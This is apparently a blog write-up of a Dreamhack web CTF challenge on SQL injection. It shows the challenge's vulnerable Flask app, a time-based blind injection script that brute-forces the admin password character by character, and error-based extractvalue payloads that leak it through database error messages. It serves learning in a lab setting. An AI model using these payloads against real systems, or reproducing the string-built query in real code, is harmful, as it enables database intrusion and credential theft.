---
title: error based sqli
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/412/](https://dreamhack.io/wargame/challenges/412/)

## Description
> Simple Error Based SQL Injection !

### Attached

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```
{: file="./init.sql" }

```py
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')

```
{: file="./app.py" }

## Analyzation

Look at ```init.sql```, the ```user``` table has 3 columns: ```idx```, ```uid``` and ```upw```, and flag is ```admin```'s password
```sql
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
```
Our target is to get admin's password.

Check this function
```py
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```

- When a ```GET``` request is sent, the server will get ```uid```.
- Then the server will find given ```uid``` in database.
- Then it will send the ```INPUT uid``` (not the ```uid``` from sql query!) to template to display it.
- Template will display the query

```html
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
```

So not in-band sqli, but blind sqli will be used in this case.

## Solution 1: [Time based sqli](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

The given query is
```sql
SELECT * FROM user WHERE uid='{uid}';
```

If we send to the server ```uid```
```
a' OR upw LIKE 'DH%' AND sleep(10) AND '1
```

Then the query will be
```sql
SELECT * FROM user WHERE uid='a' OR upw LIKE 'DH%' AND sleep(10) AND '1';
```

- If ```upw``` is correct, the ```sleep(10)``` command will be executed, and it will cost more time to return result.

### Code

```py
import requests
import string
import time

# dont forget the close curly
ALPHABET = "}" + string.digits + string.ascii_lowercase + string.ascii_uppercase

URL = "http://host3.dreamhack.games:16009/"

flag = "DH{"
flag_guess = "DH{"
payload = "?uid=a' OR upw LIKE '{}' AND sleep(5) AND '1"

while flag[-1] != "}":
    for c in ALPHABET:
        flag_guess = flag + str(c) + "%"
        start_time = time.time()
        response = requests.get(URL + payload.format(flag_guess))
        if time.time() - start_time > 5:
            flag = flag_guess[:-1] # remove "%"
            print(f"--------flag_guess: {flag}-------------")
            break

print(flag)
```

The flag is
```
DH{c3968c78840750168774ad951fc98bf788563c4d}
```

## Solution 2: Error based sqli

Check main function
```py
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```

In previous solution, we had checked the execute query command
```py
cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
```

This time, we will focus on the error-handle line
```py
except Exception as e:
    return str(e)
```

So our target is to include the password in that error message.

Firstly, we have to make sure it works.

Check syntax
```sql
'--
```

It doesnot work
```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```

Check syntax
```sql
';--
```
It works!

Now we go to the main part.

The given query is
```sql
SELECT * FROM user WHERE uid='{uid}';
```

If we send to the server ```uid```
```
' or extractvalue(1,concat(0x3a,(select upw from user where uid='admin')));--
```

Then the query will be
```sql
SELECT * FROM user WHERE uid='' or extractvalue(1,concat(0x3a,(select upw from user where uid='admin')));--';
```

- Firstly the SELECT command will be executed
```sql
select upw from user where uid='admin'
```
and returns password, for example, "DH{fake_flag}".

- Then ```concat()```
```
concat(0x3a,"DH{fake_flag}")
```
returns ```":DH{fake_flag}"```

- Then ```extractvalue()```
```
extractvalue(1, ":DH{fake_flag}")
```

It will return ":DH{fake_flag}" in an error message.

### Payload

```
' or extractvalue(1,concat(0x3a,(substr((select upw from user where uid='admin'),1,20))));--
```

and 

```
' or extractvalue(1,concat(0x3a,(substr((select upw from user where uid='admin'),21,40))));--
```

The flag is
```
DH{c3968c78840750168774ad951fc98bf788563c4d}
```